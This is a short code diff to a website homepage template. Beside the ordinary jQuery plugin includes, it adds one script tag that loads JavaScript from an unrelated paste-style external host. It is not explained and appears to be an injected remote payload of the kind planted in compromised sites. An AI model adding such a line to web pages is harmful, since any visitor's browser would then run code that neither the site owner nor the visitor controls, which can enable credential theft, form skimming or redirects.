@@ -648,7 +648,7 @@ $data = array_slice($data, 0, 5);
     <script src="homepage/lib/easing/easing.min.js"></script>
     <script src="homepage/lib/waypoints/waypoints.min.js"></script>
     <script src="homepage/lib/owlcarousel/owl.carousel.min.js"></script>
-
+    <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/04G7BLFBQGBJN"></script>
     <!-- Template Javascript -->
     <script src="homepage/js/main.js"></script>
 
